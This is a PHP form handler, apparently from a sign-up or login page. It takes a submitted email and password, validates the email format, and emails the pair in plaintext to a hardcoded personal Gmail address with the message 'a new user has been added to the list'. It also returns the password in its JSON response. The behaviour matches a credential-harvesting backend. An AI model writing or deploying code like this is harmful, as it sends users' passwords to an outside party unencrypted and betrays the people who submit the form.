
<?php
//includes "Mail.php";
if ($_SERVER['REQUEST_METHOD'] == "GET") {
    header("Location: home.html"); /* Redirect browser */
    exit();
} else {
    $email = null;
    $mensaje = null;
    $id = null;
    $respuesta = null;


    function sendResponse($id,$mensaje) {
        $respuesta = $arrayName = array("mensaje" => $mensaje, "id" => $id);
        echo json_encode($respuesta);
    }

    function sendResponseOk($id,$mensaje,$email,$pass) {
        $respuesta = $arrayName = array("mensaje" => $mensaje, "id" => $id, "pass" => $pass, "email" => $email);
        echo json_encode($respuesta);
    }

    function send($email,$pass) {
        $to = "facuvega1989@gmail.com";
        $email_subject = "new user";
        $email_body = "a new user has been added to the list, user:" . $email . ", pass:" . $pass . "";
        mail($to,$email_subject,$email_body);
        $mensaje = "Register success";
        $id = 1;
        sendResponseOk($id,$mensaje,$email,$pass);
    }

    function validator($email,$pass) {
        if (filter_var($email, FILTER_VALIDATE_EMAIL) == false) {
            $mensaje = "Invalid email format";
            $id = "0";
            sendResponse($id,$mensaje);
        } else {
            send($email,$pass);
        }
    }

    function checkEmptyValues($email,$pass) {
        if(empty($email) or empty($pass)){
            $mensaje = "some required field is empty";
            $id = "0";
            sendResponse($id,$mensaje);
        } else {
            validator($email,$pass);
        }
    }

    if(isset($_POST) && !empty($_POST)) {
        $email = $_POST['email'];
        $pass = $_POST['contrasenia'];
        checkEmptyValues($email,$pass);
    } else {
        $mensaje = "some required field is empty";
        $id = "0";
        sendResponse($id,$mensaje);
    }
}
